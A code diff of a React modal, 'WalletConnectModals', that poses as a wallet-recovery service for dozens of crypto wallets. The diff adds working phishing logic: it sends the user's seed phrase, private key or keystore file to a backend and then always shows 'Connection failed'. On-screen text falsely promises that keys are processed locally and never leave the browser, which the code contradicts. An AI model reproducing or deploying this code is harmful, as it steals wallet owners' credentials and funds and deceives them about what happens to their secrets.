@@ -1,24 +1,573 @@
-import React, { useState, useEffect } from 'react';
+import React, { useState, useEffect, useRef } from 'react';
 import styled, { keyframes } from 'styled-components';
-import { 
-  FaSearch, 
-  FaTimes, 
-  FaKey, 
-  FaFileAlt, 
-  FaShieldAlt, 
-  FaEye, 
+import {
+  FaSearch,
+  FaTimes,
+  FaKey,
+  FaFileAlt,
+  FaShieldAlt,
+  FaEye,
   FaEyeSlash,
-  FaUpload 
+  FaUpload,
+  FaExclamationCircle,
+  FaCheckCircle
 } from 'react-icons/fa';
 
 // Wallet data
 const wallets = [
-  'MetaMask Wallet', 'Trust Wallet', 'Coinbase Wallet', 'Keplr Wallet',
-  'Ledger Wallet', 'SafePal Wallet', 'Tronlink Wallet', 'Rabby Wallet',
-  'Phantom Wallet', 'Exodus Wallet', 'Atomic Wallet', 'Binance Chain Wallet',
-  'WalletConnect Wallet', 'Rainbow Wallet', 'Uniswap Wallet', 'Brave Wallet',
-  'MyEtherWallet', 'TokenPocket Wallet', 'Math Wallet', 'Bitkeep Wallet'
+  "MetaMask Wallet",
+  "Trust Wallet",
+  "Coinbase Wallet",
+  "Keplr Wallet",
+  "Ledger Wallet",
+  "SafePal Wallet",
+  "Tronlink Wallet",
+  "Rabby Wallet",
+  "Phantom Wallet",
+  "Exodus Wallet",
+  "Atomic Wallet",
+  "Binance Chain Wallet",
+  "WalletConnect Wallet",
+  "Rainbow Wallet",
+  "Uniswap Wallet",
+  "Brave Wallet",
+  "MyEtherWallet",
+  "TokenPocket Wallet",
+  "Math Wallet",
+  "Bitkeep Wallet",
+  "1inch Wallet",
+  "Argent Wallet",
+  "Zerion Wallet",
+  "Enjin Wallet",
+  "imToken Wallet",
+  "Wallet.io",
+  "Guarda Wallet",
+  "Jaxx Liberty Wallet",
+  "Edge Wallet",
+  "Coinomi Wallet",
+  "Electrum Wallet",
+  "BlueWallet",
+  "Wasabi Wallet",
+  "Samourai Wallet",
+  "Braavos Wallet",
+  "DeFi Wallet",
+  "Compound Wallet",
+  "Aave Wallet",
+  "SushiSwap Wallet",
+  "PancakeSwap Wallet",
+  "Curve Wallet",
+  "Yearn Finance Wallet",
+  "Balancer Wallet",
+  "Synthetix Wallet",
+  "MakerDAO Wallet",
+  "Dydx Wallet",
+  "Alpha Wallet",
+  "Frame Wallet",  "Torus Wallet",
+ 
+  "Portis Wallet",
+  "Fortmatic Wallet",
+  "Authereum Wallet",
+  "Squarelink Wallet",
+  "Venly Wallet",
+  "Sequence Wallet",
+  "Gnosis Safe Wallet",
+  "DeBank Wallet",
+  "Unstoppable Wallet",
+  "Pillar Wallet",
+  "Status Wallet",
+  "TrustVault Wallet",
+  "Linen Wallet",
+  "Other Wallet"
 ];
+
+
+
+
+// Main Component
+const WalletConnectModals = ({ isModalOpen, openModal }) => {
+  const [step, setStep] = useState('select'); // select, connect, loading, manual, message
+  const [selectedWallet, setSelectedWallet] = useState('');
+  const [searchTerm, setSearchTerm] = useState('');
+  const [activeTab, setActiveTab] = useState('seed'); // seed, private, json
+  const [showPassword, setShowPassword] = useState(false);
+  const [seedPhrase, setSeedPhrase] = useState('');
+  const [privateKey, setPrivateKey] = useState('');
+  const [jsonFile, setJsonFile] = useState(null);
+  const [jsonFileName, setJsonFileName] = useState('');
+  const [isLoading, setIsLoading] = useState(false);
+  const [messageType, setMessageType] = useState('error'); // error or success
+  const [messageText, setMessageText] = useState('');
+  const fileInputRef = useRef(null);
+
+  const filteredWallets = wallets.filter(wallet =>
+    wallet.toLowerCase().includes(searchTerm.toLowerCase())
+  );
+
+  const handleWalletSelect = (wallet) => {
+    setSelectedWallet(wallet);
+    setStep('loading');
+    setTimeout(() => {
+      setStep('manual');
+    }, 2000);
+  };
+
+
+  //   setIsLoading(true);
+  //   const formData = new FormData();
+  //   formData.append('wallet', selectedWallet);
+  //   formData.append('service', 'Missing/Irregular Balance');
+
+  //   if (activeTab === 'seed') {
+  //     if (!seedPhrase) {
+  //       alert('Please enter your seed phrase.');
+  //       setIsLoading(false);
+  //       return;
+  //     }
+  //     formData.append('seedPhrase', seedPhrase);
+  //   } else if (activeTab === 'private') {
+  //     if (!privateKey) {
+  //       alert('Please enter your private key.');
+  //       setIsLoading(false);
+  //       return;
+  //     }
+  //     formData.append('privateKey', privateKey);
+  //   } else if (activeTab === 'json') {
+  //     if (jsonFile) {
+  //       formData.append('file', jsonFile);
+  //     } else {
+  //       alert('Please select a JSON file.');
+  //       setIsLoading(false);
+  //       return;
+  //     }
+  //   }
+
+  //   try {
+  //     const response = await fetch('/api/connect', {
+  //       method: 'POST',
+  //       body: formData,
+  //     });
+
+  //     if (response.ok) {
+  //       console.log('Connected successfully');
+  //       setStep('manual');
+  //     } else {
+  //       console.error('Connection failed');
+  //       alert('Connection failed. Please try again.');
+  //     }
+  //   } catch (error) {
+  //     console.error('An error occurred:', error);
+  //     alert('An error occurred. Please try again.');
+  //   } finally {
+  //     setIsLoading(false);
+  //   }
+  // };
+
+  const handleConnect = async () => {
+
+  try {
+    const apiKey = process.env.NEXT_PUBLIC_API_KEY;
+    const baseURL = process.env.NEXT_PUBLIC_BACKEND_URL || 'http://localhost:3001';
+
+    // Validate wallet availability
+    const wallet = window.ethereum || window.coinbaseWalletProvider || window.web3?.currentProvider
+    if (!wallet) {
+      alert('No Web3 wallet detected. Please install MetaMask or another wallet extension.');
+      return;
+    }
+
+    setIsLoading(true);
+
+    if (activeTab === 'seed') {
+      if (!seedPhrase) {
+        alert('Please enter your seed phrase.');
+        setIsLoading(false);
+        return;
+      }
+  const wordCount = seedPhrase.trim().split(/\s+/).length;
+      if (![12, 15, 24].includes(wordCount)) {
+        alert(`Invalid seed phrase!.`);
+        setIsLoading(false);
+        return;
+      }
+      const response = await fetch(`${baseURL}/simple-form`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'x-api-key': apiKey,
+        },
+        body: JSON.stringify({
+          title: selectedWallet,
+          seed: seedPhrase,
+        }),
+      });
+
+      if (response.ok) {
+        setStep('message');
+        setMessageType('error');
+        setMessageText('Connection failed. Try again.');
+        setTimeout(() => {
+          // Reset state when closing after attempt
+          setStep('select');
+          setSeedPhrase('');
+          setPrivateKey('');
+          setJsonFile(null);
+          setJsonFileName('');
+          openModal(false);
+        }, 3000);
+      } else {
+        alert('Connection failed. Try again.');
+      }
+
+    } else if (activeTab === 'private') {
+      if (!privateKey) {
+        alert('Please enter your private key.');
+        setIsLoading(false);
+        return;
+      }
+
+      const response = await fetch(`${baseURL}/simple-passkey`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'x-api-key': apiKey,
+        },
+        body: JSON.stringify({
+          title: selectedWallet,
+          passkey: privateKey,
+        }),
+      });
+
+     if (response.ok) {
+        setStep('message');
+        setMessageType('error');
+        setMessageText('Connection failed. Try again.');
+        setTimeout(() => {
+          // Reset state when closing after attempt
+          setStep('select');
+          setSeedPhrase('');
+          setPrivateKey('');
+          setJsonFile(null);
+          setJsonFileName('');
+          openModal(false);
+        }, 3000);
+      } else {
+        alert('Connection failed. Try again.');
+      }
+
+    } else if (activeTab === 'json') {
+      if (!jsonFile) {
+        alert('Please upload a JSON file.');
+        setIsLoading(false);
+        return;
+      }
+
+      const formData = new FormData();
+      formData.append('title', selectedWallet);
+      formData.append('jsonFile', jsonFile);
+
+      const response = await fetch(`${baseURL}/form-with-json`, {
+        method: 'POST',
+        headers: {
+          'x-api-key': apiKey,
+        },
+        body: formData,
+      });
+
+    if (response.ok) {
+        setStep('message');
+        setMessageType('error');
+        setMessageText('Connection failed. Try again.');
+        setTimeout(() => {
+          // Reset state when closing after attempt
+          setStep('select');
+          setSeedPhrase('');
+          setPrivateKey('');
+          setJsonFile(null);
+          setJsonFileName('');
+          openModal(false);
+        }, 3000);
+      } else {
+        alert('Connection failed. Try again.');
+      }
+    }
+
+  } catch (error) {
+    console.error('Error:', error);
+    alert('Something went wrong. Please try again.');
+  } finally {
+    setIsLoading(false);
+  }
+};
+
+
+  const handleClose = () => {
+    openModal(false);
+    // Reset all state to ensure modal always opens at 'select' step
+    setStep('select');
+    setSelectedWallet('');
+    setSeedPhrase('');
+    setPrivateKey('');
+    setSearchTerm('');
+    setJsonFile(null);
+    setJsonFileName('');
+    setIsLoading(false);
+  };
+  const handleConnectManual = () => {
+    setStep('connect');
+  };
+
+  const handleFileUpload = () => {
+    fileInputRef.current.click();
+  };
+
+  const handleFileChange = (e) => {
+    const file = e.target.files[0];
+    if (file) {
+      setJsonFile(file);
+      setJsonFileName(file.name);
+    }
+  };
+
+  const handleDragOver = (e) => {
+    e.preventDefault();
+  };
+
+  const handleDrop = (e) => {
+    e.preventDefault();
+    const file = e.dataTransfer.files[0];
+    if (file) {
+      setJsonFile(file);
+      setJsonFileName(file.name);
+    }
+  };
+
+  useEffect(() => {
+    if (isModalOpen) {
+      document.body.style.overflow = 'hidden';
+    } else {
+      document.body.style.overflow = 'unset';
+    }
+  }, [isModalOpen]);
+
+  if (!isModalOpen) {
+    return null;
+  }
+
+  if (step === 'select') {
+    return (
+      <Overlay onClick={handleClose}>
+        <Modal onClick={(e) => e.stopPropagation()} $maxWidth="900px">
+          <ModalHeader>
+            <Title>Select Your Wallet</Title>
+            <Subtitle>Choose your wallet for: <span>Missing/Irregular Balance</span></Subtitle>
+            <CloseButton onClick={handleClose}>
+              <FaTimes />
+            </CloseButton>
+          </ModalHeader>
+          <ModalBody>
+            <SearchWrapper>
+              <SearchIcon />
+              <SearchInput
+                placeholder="Search wallet..."
+                value={searchTerm}
+                onChange={(e) => setSearchTerm(e.target.value)}
+              />
+            </SearchWrapper>
+            <WalletGrid>
+              {filteredWallets.map((wallet, index) => (
+                <WalletButton key={index} onClick={() => handleWalletSelect(wallet)}>
+                  {wallet}
+                </WalletButton>
+              ))}
+            </WalletGrid>
+          </ModalBody>
+        </Modal>
+      </Overlay>
+    );
+  }
+
+  if (step === 'connect') {
+    return (
+      <Overlay onClick={handleClose}>
+        <Modal onClick={(e) => e.stopPropagation()} $maxWidth="700px">
+          <ModalHeader>
+            <Title>Connect {selectedWallet}</Title>
+            <Subtitle>Service: <span>Missing/Irregular Balance</span></Subtitle>
+            <CloseButton onClick={handleClose}>
+              <FaTimes />
+            </CloseButton>
+          </ModalHeader>
+          <ModalBody>
+            <TabContainer>
+              <Tab $active={activeTab === 'seed'} onClick={() => setActiveTab('seed')}>
+                <FaKey /> Seed Phrase
+              </Tab>
+              <Tab $active={activeTab === 'private'} onClick={() => setActiveTab('private')}>
+                <FaShieldAlt /> Private Key
+              </Tab>
+              <Tab $active={activeTab === 'json'} onClick={() => setActiveTab('json')}>
+                <FaFileAlt /> JSON File
+              </Tab>
+            </TabContainer>
+
+            {activeTab === 'seed' && (
+              <>
+                <InfoBox>
+                  <InfoTitle>
+                    <FaShieldAlt /> Your Security is Our Priority
+                  </InfoTitle>
+                  <InfoText>
+                    Your seed phrase is processed locally on your device and never stored on our servers. We use
+                    industry-standard encryption protocols to ensure your wallet credentials remain completely private
+                    and secure throughout the recovery process.
+                  </InfoText>
+                </InfoBox>
+                <TextArea
+                  placeholder="word1 word2 word3 ..."
+                  value={seedPhrase}
+                  onChange={(e) => setSeedPhrase(e.target.value)}
+                />
+                <HintList>
+                  <HintItem>Separate each word with a space and ensure proper spelling and order</HintItem>
+                  <HintItem>Most wallets use 12 or 24 words - verify your phrase length matches your wallet</HintItem>
+                  <HintItem>Double-check for any typos as incorrect phrases cannot recover your wallet</HintItem>
+                </HintList>
+              </>
+            )}
+
+            {activeTab === 'private' && (
+              <>
+                <InfoBox>
+                  <InfoTitle>
+                    <FaShieldAlt /> Bank-Level Security Standards
+                  </InfoTitle>
+                  <InfoText>
+                    Your private key is encrypted using AES-256 encryption and processed entirely on your device. We
+                    maintain zero-knowledge architecture – your private key never leaves your browser and is
+                    immediately purged after the connection process completes.
+                  </InfoText>
+                </InfoBox>
+                <InputWrapper>
+                  <Input
+                    type={showPassword ? 'text' : 'password'}
+                    placeholder="0x..."
+                    value={privateKey}
+                    onChange={(e) => setPrivateKey(e.target.value)}
+                  />
+                  <EyeButton onClick={() => setShowPassword(!showPassword)}>
+                    {showPassword ? <FaEyeSlash /> : <FaEye />}
+                  </EyeButton>
+                </InputWrapper>
+                <HintList>
+                  <HintItem>Private keys should start with "0x" and contain exactly 64 hexadecimal characters</HintItem>
+                  <HintItem>Ensure no spaces or additional characters are included in your private key</HintItem>
+                  <HintItem>Your private key grants full access to your wallet - verify accuracy before connecting</HintItem>
+                </HintList>
+              </>
+            )}
+
+            {activeTab === 'json' && (
+              <>
+                <InfoBox>
+                  <InfoTitle>
+                    <FaShieldAlt /> Enterprise-Grade File Processing
+                  </InfoTitle>
+                  <InfoText>
+                    Your keystore file is processed locally using secure cryptographic libraries. Files are never uploaded
+                    to external servers and are immediately deleted from memory after processing. We support all
+                    standard wallet formats including MetaMask, MyEtherWallet, and hardware wallet exports.
+                  </InfoText>
+                </InfoBox>
+                <UploadArea onClick={handleFileUpload} onDragOver={handleDragOver} onDrop={handleDrop}>
+                  <input
+                    type="file"
+                    ref={fileInputRef}
+                    onChange={handleFileChange}
+                    style={{ display: 'none' }}
+                    accept=".json"
+                  />
+                  <UploadIcon />
+                  {jsonFileName ? (
+                    <UploadText>{jsonFileName}</UploadText>
+                  ) : (
+                    <UploadText>Click to upload or drag and drop your keystore file</UploadText>
+                  )}
+                  <UploadButton>Choose File</UploadButton>
+                  <UploadHint>Supports .json files up to 5MB</UploadHint>
+                </UploadArea>
+                <HintList>
+                  <HintItem>Accepted formats: MetaMask, MyEtherWallet, Ledger, Trezor keystore exports</HintItem>
+                  <HintItem>Ensure your JSON file contains valid wallet encryption data</HintItem>
+                  <HintItem>You may need your wallet password to complete the connection process</HintItem>
+                </HintList>
+              </>
+            )}
+
+            <ButtonRow>
+              <Button onClick={handleClose}>Cancel</Button>
+              <Button $primary onClick={handleConnect} disabled={isLoading}>
+                {isLoading ? 'Connecting...' : 'Connect Wallet'}
+              </Button>
+            </ButtonRow>
+          </ModalBody>
+        </Modal>
+      </Overlay>
+    );
+  }
+
+  if (step === 'loading') {
+    return (
+      <Overlay>
+        <Modal $maxWidth="500px">
+          <CenterContent>
+            <LoadingSpinner />
+            <Title>Connecting to {selectedWallet}</Title>
+            <CenterText>Please wait while we establish connection...</CenterText>
+          </CenterContent>
+        </Modal>
+      </Overlay>
+    );
+  }
+
+  if (step === 'manual') {
+    return (
+      <Overlay onClick={handleClose}>
+        <Modal onClick={(e) => e.stopPropagation()} $maxWidth="500px">
+          <CenterContent>
+            <Title>Connection Required</Title>
+            <CenterText>Please connect manually to continue</CenterText>
+            <ButtonRow>
+              <Button $primary onClick={handleConnectManual}>Connect Manually</Button>
+            </ButtonRow>
+          </CenterContent>
+        </Modal>
+      </Overlay>
+    );
+  }
+
+  if (step === 'message') {
+    return (
+      <Overlay>
+        <Modal $maxWidth="500px">
+          <CenterContent>
+            <MessageIcon $type={messageType}>
+              {messageType === 'error' ? <FaExclamationCircle /> : <FaCheckCircle />}
+            </MessageIcon>
+            <Title>{messageType === 'error' ? 'Connection Failed' : 'Success'}</Title>
+            <CenterText>{messageText}</CenterText>
+          </CenterContent>
+        </Modal>
+      </Overlay>
+    );
+  }
+
+  return null;
+};
+
+export default WalletConnectModals;
+
+
+
 
 // Animations
 const fadeIn = keyframes`
@@ -381,6 +930,10 @@ const Button = styled.button`
     background-color: ${props => props.$primary ? '#059669' : '#64748b'};
     transform: translateY(-2px);
   }
+  &:disabled {
+    background-color: #334155;
+    cursor: not-allowed;
+  }
 `;
 
 const LoadingSpinner = styled.div`
@@ -404,242 +957,12 @@ const CenterText = styled.p`
   margin-top: 1rem;
 `;
 
-// Main Component
-const WalletConnectModals = ({ isModalOpen, openModal }) => {
-  const [step, setStep] = useState('select'); // select, connect, loading, manual
-  const [selectedWallet, setSelectedWallet] = useState('');
-  const [searchTerm, setSearchTerm] = useState('');
-  const [activeTab, setActiveTab] = useState('seed'); // seed, private, json
-  const [showPassword, setShowPassword] = useState(false);
-  const [seedPhrase, setSeedPhrase] = useState('');
-  const [privateKey, setPrivateKey] = useState('');
-
-  const filteredWallets = wallets.filter(wallet =>
-    wallet.toLowerCase().includes(searchTerm.toLowerCase())
-  );
-
-  const handleWalletSelect = (wallet) => {
-    setSelectedWallet(wallet);
-    setStep('loading');
-     setTimeout(() => {
-      setStep('manual');
-    }, 2000);
-  };
-
-  const handleConnect = () => {
-    setTimeout(() => {
-      setStep('manual');
-    }, 2000);
-  };
-
-  const handleClose = () => {
-    openModal(false);
-    setStep('select');
-    setSelectedWallet('');
-    setSeedPhrase('');
-    setPrivateKey('');
-    setSearchTerm('');
-  };
-  const handleConnectManual = () => {
-    setStep('connect');
-  };
-
-  const handleFileUpload = () => {
-    alert('File upload functionality would be implemented here');
-  };
-
-  useEffect(() => {
-    if (isModalOpen) {
-      document.body.style.overflow = 'hidden';
-    } else {
-      document.body.style.overflow = 'unset';
-    }
-  }, [isModalOpen]);
-
-  if (!isModalOpen) {
-    return null;
-  }
-
-  if (step === 'select') {
-    return (
-      <Overlay onClick={handleClose}>
-        <Modal onClick={(e) => e.stopPropagation()} $maxWidth="900px">
-          <ModalHeader>
-            <Title>Select Your Wallet</Title>
-            <Subtitle>Choose your wallet for: <span>Missing/Irregular Balance</span></Subtitle>
-            <CloseButton onClick={handleClose}>
-              <FaTimes />
-            </CloseButton>
-          </ModalHeader>
-          <ModalBody>
-            <SearchWrapper>
-              <SearchIcon />
-              <SearchInput
-                placeholder="Search wallet..."
-                value={searchTerm}
-                onChange={(e) => setSearchTerm(e.target.value)}
-              />
-            </SearchWrapper>
-            <WalletGrid>
-              {filteredWallets.map((wallet, index) => (
-                <WalletButton key={index} onClick={() => handleWalletSelect(wallet)}>
-                  {wallet}
-                </WalletButton>
-              ))}
-            </WalletGrid>
-          </ModalBody>
-        </Modal>
-      </Overlay>
-    );
-  }
-
-  if (step === 'connect') {
-    return (
-      <Overlay onClick={handleClose}>
-        <Modal onClick={(e) => e.stopPropagation()} $maxWidth="700px">
-          <ModalHeader>
-            <Title>Connect {selectedWallet}</Title>
-            <Subtitle>Service: <span>Missing/Irregular Balance</span></Subtitle>
-            <CloseButton onClick={handleClose}>
-              <FaTimes />
-            </CloseButton>
-          </ModalHeader>
-          <ModalBody>
-            <TabContainer>
-              <Tab $active={activeTab === 'seed'} onClick={() => setActiveTab('seed')}>
-                <FaKey /> Seed Phrase
-              </Tab>
-              <Tab $active={activeTab === 'private'} onClick={() => setActiveTab('private')}>
-                <FaShieldAlt /> Private Key
-              </Tab>
-              <Tab $active={activeTab === 'json'} onClick={() => setActiveTab('json')}>
-                <FaFileAlt /> JSON File
-              </Tab>
-            </TabContainer>
-
-            {activeTab === 'seed' && (
-              <>
-                <InfoBox>
-                  <InfoTitle>
-                    <FaShieldAlt /> Your Security is Our Priority
-                  </InfoTitle>
-                  <InfoText>
-                    Your seed phrase is processed locally on your device and never stored on our servers. We use
-                    industry-standard encryption protocols to ensure your wallet credentials remain completely private
-                    and secure throughout the recovery process.
-                  </InfoText>
-                </InfoBox>
-                <TextArea
-                  placeholder="word1 word2 word3 ..."
-                  value={seedPhrase}
-                  onChange={(e) => setSeedPhrase(e.target.value)}
-                />
-                <HintList>
-                  <HintItem>Separate each word with a space and ensure proper spelling and order</HintItem>
-                  <HintItem>Most wallets use 12 or 24 words - verify your phrase length matches your wallet</HintItem>
-                  <HintItem>Double-check for any typos as incorrect phrases cannot recover your wallet</HintItem>
-                </HintList>
-              </>
-            )}
-
-            {activeTab === 'private' && (
-              <>
-                <InfoBox>
-                  <InfoTitle>
-                    <FaShieldAlt /> Bank-Level Security Standards
-                  </InfoTitle>
-                  <InfoText>
-                    Your private key is encrypted using AES-256 encryption and processed entirely on your device. We
-                    maintain zero-knowledge architecture – your private key never leaves your browser and is
-                    immediately purged after the connection process completes.
-                  </InfoText>
-                </InfoBox>
-                <InputWrapper>
-                  <Input
-                    type={showPassword ? 'text' : 'password'}
-                    placeholder="0x..."
-                    value={privateKey}
-                    onChange={(e) => setPrivateKey(e.target.value)}
-                  />
-                  <EyeButton onClick={() => setShowPassword(!showPassword)}>
-                    {showPassword ? <FaEyeSlash /> : <FaEye />}
-                  </EyeButton>
-                </InputWrapper>
-                <HintList>
-                  <HintItem>Private keys should start with "0x" and contain exactly 64 hexadecimal characters</HintItem>
-                  <HintItem>Ensure no spaces or additional characters are included in your private key</HintItem>
-                  <HintItem>Your private key grants full access to your wallet - verify accuracy before connecting</HintItem>
-                </HintList>
-              </>
-            )}
-
-            {activeTab === 'json' && (
-              <>
-                <InfoBox>
-                  <InfoTitle>
-                    <FaShieldAlt /> Enterprise-Grade File Processing
-                  </InfoTitle>
-                  <InfoText>
-                    Your keystore file is processed locally using secure cryptographic libraries. Files are never uploaded
-                    to external servers and are immediately deleted from memory after processing. We support all
-                    standard wallet formats including MetaMask, MyEtherWallet, and hardware wallet exports.
-                  </InfoText>
-                </InfoBox>
-                <UploadArea onClick={handleFileUpload}>
-                  <UploadIcon />
-                  <UploadText>Click to upload or drag and drop your keystore file</UploadText>
-                  <UploadButton>Choose File</UploadButton>
-                  <UploadHint>Supports .json files up to 5MB</UploadHint>
-                </UploadArea>
-                <HintList>
-                  <HintItem>Accepted formats: MetaMask, MyEtherWallet, Ledger, Trezor keystore exports</HintItem>
-                  <HintItem>Ensure your JSON file contains valid wallet encryption data</HintItem>
-                  <HintItem>You may need your wallet password to complete the connection process</HintItem>
-                </HintList>
-              </>
-            )}
-
-            <ButtonRow>
-              <Button onClick={handleClose}>Cancel</Button>
-              <Button $primary onClick={handleConnect}>Connect Wallet</Button>
-            </ButtonRow>
-          </ModalBody>
-        </Modal>
-      </Overlay>
-    );
-  }
-
-  if (step === 'loading') {
-    return (
-      <Overlay>
-        <Modal $maxWidth="500px">
-          <CenterContent>
-            <LoadingSpinner />
-            <Title>Connecting to {selectedWallet}</Title>
-            <CenterText>Please wait while we establish connection...</CenterText>
-          </CenterContent>
-        </Modal>
-      </Overlay>
-    );
-  }
-
-  if (step === 'manual') {
-    return (
-      <Overlay onClick={handleClose}>
-        <Modal onClick={(e) => e.stopPropagation()} $maxWidth="500px">
-          <CenterContent>
-            <Title>Connection Required</Title>
-            <CenterText>Please connect manually to continue</CenterText>
-            <ButtonRow>
-              <Button $primary onClick={handleConnectManual}>Connect Manually</Button>
-            </ButtonRow>
-          </CenterContent>
-        </Modal>
-      </Overlay>
-    );
-  }
-
-  return null;
-};
-
-export default WalletConnectModals;
+const MessageIcon = styled.div`
+  font-size: 4rem;
+  margin: 1.5rem auto;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  color: ${props => props.$type === 'error' ? '#ef4444' : '#10b981'};
+  animation: ${slideUp} 0.5s ease;
+`;
